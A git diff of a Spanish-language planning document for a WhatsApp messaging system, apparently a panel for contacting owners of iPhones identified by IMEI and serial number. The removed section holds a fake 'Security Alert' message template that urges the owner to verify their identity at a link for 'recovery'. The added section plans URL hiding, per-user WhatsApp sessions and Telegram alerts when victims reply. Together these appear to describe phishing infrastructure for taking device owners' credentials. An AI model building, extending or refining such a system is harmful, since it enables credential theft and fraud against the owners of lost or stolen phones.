@@ -1,52 +1,107 @@
-
-
-# Plan: Botón "WA Directo" para Admin
+# Plan: Integración WhatsApp Web.js — Paridad completa con UltraMsg
 
 ## Resumen
 
-Agregar un nuevo botón exclusivo para admin en la lista de procesos que al hacer click abra WhatsApp directamente (WhatsApp Web en PC, WhatsApp Business en móvil) con un mensaje pre-armado corto sobre el equipo del proceso.
+Cada usuario puede vincular su propio WhatsApp escaneando un QR. Los mensajes se envían desde su sesión personal con las **mismas funciones** que UltraMsg: texto, imágenes, ocultación de URLs, y notificaciones a Telegram cuando responden. Si la sesión se desconecta, fallback automático a UltraMsg.
 
-## Funcionamiento
+## Arquitectura
 
-- **Móvil**: Abre `https://api.whatsapp.com/send?phone=...&text=...` (se abre en WhatsApp Business si está instalado)
-- **PC**: Abre `https://web.whatsapp.com/send?phone=...&text=...` (WhatsApp Web)
-- Detección de dispositivo usando `window.innerWidth < 768` o `navigator.userAgent`
-
-## Mensaje (versión corta)
-
-Genera un mensaje compacto con los datos clave del proceso:
 ```
-🔒 Alerta de Seguridad
-
-Dispositivo detectado en línea.
-
-📱 {iphone_model} - {color} - {storage}
-IMEI: {imei}
-Serie: {serial_number}
-
-Verifique su identidad en el siguiente enlace para proceder con la recuperación.
+Frontend (React) ──▶ Edge Functions (proxy) ──▶ VPS (whatsapp-web.js)
+                                                    │
+                                                    ▼ (mensaje entrante)
+                                              Edge Function webhook
+                                                    │
+                                                    ▼
+                                              Telegram notification
 ```
 
-Con variación español/inglés según el country_code del proceso.
+## VPS API (fuera de Lovable)
 
-## Cambios
+API REST con Express + whatsapp-web.js:
 
-### `src/components/ProcessList.tsx`
-- Agregar nuevo botón "WA Dir" después del botón "WA Web", solo visible para `userType === 'admin'`
-- Crear función `handleOpenWhatsAppDirect(process)` que:
-  1. Detecta si es móvil o PC
-  2. Genera mensaje corto con datos del equipo
-  3. Construye URL con `encodeURIComponent`
-  4. Abre en nueva pestaña con `window.open`
-- Estilo del botón: verde oscuro, consistente con los demás
+| Endpoint | Método | Descripción |
+|----------|--------|-------------|
+| `/session/start` | POST | Inicia sesión, genera QR |
+| `/session/qr/:userId` | GET | Devuelve QR en base64 |
+| `/session/status/:userId` | GET | `connected`, `disconnected`, `qr_pending` |
+| `/session/send/:userId` | POST | Envía texto + imagen opcional |
+| `/session/destroy/:userId` | POST | Cierra sesión |
 
-## Detalle Técnico
+**Webhook de mensajes entrantes**: Cuando llega un mensaje al WhatsApp del usuario, el VPS llama a `whatsapp-webjs-webhook` con: `{ userId, senderPhone, messageText, senderName }`.
 
-- No requiere API, edge functions, ni créditos
-- Solo abre un link directo a WhatsApp
-- El botón incluirá el flag del idioma como los demás (`🇺🇸` / `🇪🇸`)
+## Base de Datos
 
-## Fix adicional
+**Tabla `user_whatsapp_sessions`** (ya creada):
+- id, user_id, session_status, connected_phone, created_at, updated_at
 
-Se corregirá el error de runtime del botón flotante de WhatsApp de soporte que intenta hacer `window.top.location.href` dentro del iframe del preview (SecurityError).
+**Settings en `system_settings`**:
+- `whatsapp_webjs_api_url` → URL base del VPS
+- `whatsapp_webjs_api_key` → Token de autenticación
 
+## Edge Functions
+
+### 1. `whatsapp-webjs-proxy` (ya creada)
+Proxy para QR, status, destroy entre frontend y VPS.
+
+### 2. `send-whatsapp-webjs` (ya creada)
+Envío con fallback automático a UltraMsg. Soporta texto + imagen.
+
+### 3. `whatsapp-webjs-webhook` (NUEVA) ⭐
+Recibe mensajes entrantes del VPS y notifica a Telegram:
+1. Recibe: `{ userId, senderPhone, messageText }`
+2. Busca procesos del usuario que coincidan con `senderPhone`
+3. Obtiene `telegram_bot_token` y `telegram_chat_id` del perfil
+4. Envía notificación a Telegram con formato idéntico a `ultramsg-webhook`:
+   - 📱 Cliente, modelo, IMEI, serie, propietario
+   - 📞 Teléfono del remitente
+   - 💬 Texto del mensaje
+5. Registra en `whatsapp_telegram_log`
+
+## Frontend
+
+### WhatsAppQRScanner.tsx (ya creado)
+- Muestra QR, polling cada 3s, estados visuales, botón desconectar
+
+### Dashboards
+- Sección "WhatsApp Personal" en UserDashboard y AdminDashboard
+- Admin: botón extra "WA Web" en ProcessList para pruebas
+
+## Lógica de Envío
+
+```
+Enviar mensaje WhatsApp
+├── ¿Sesión activa? → SÍ → Enviar via VPS (texto + imagen)
+│                              ├── Éxito ✅ (sin descuento de créditos)
+│                              └── Error → Marcar disconnected → Reenviar via UltraMsg
+└── NO → Enviar via UltraMsg (descuenta créditos normalmente)
+```
+
+**Funciones con paridad completa:**
+- ✅ Envío de texto
+- ✅ Envío de imágenes
+- ✅ Ocultación de URLs en el mensaje
+- ✅ Notificaciones a Telegram al recibir respuestas
+- ✅ Registro en whatsapp_telegram_log
+- ✅ Fallback automático a UltraMsg
+
+## Restricciones
+
+- **WAPRO (Whapi.cloud)**: exclusivo admin, sin cambios
+- **WA Dir**: exclusivo admin, sin cambios
+- **Créditos**: envío via whatsapp-web.js NO descuenta créditos
+- **Fallback a UltraMsg**: SÍ descuenta créditos
+
+## Pasos de Implementación
+
+1. ✅ Tabla `user_whatsapp_sessions` (ya creada)
+2. ✅ Edge function `whatsapp-webjs-proxy` (ya creada)
+3. ✅ Edge function `send-whatsapp-webjs` (ya creada)
+4. ✅ Componente `WhatsAppQRScanner.tsx` (ya creado)
+5. **NUEVO**: Crear edge function `whatsapp-webjs-webhook` para notificaciones Telegram
+6. Configurar VPS settings en panel admin (URL + API key)
+7. Generar script Node.js completo para el VPS
+
+## Requisito Previo
+
+Montar API de whatsapp-web.js en VPS. Se generará el script completo listo para desplegar.
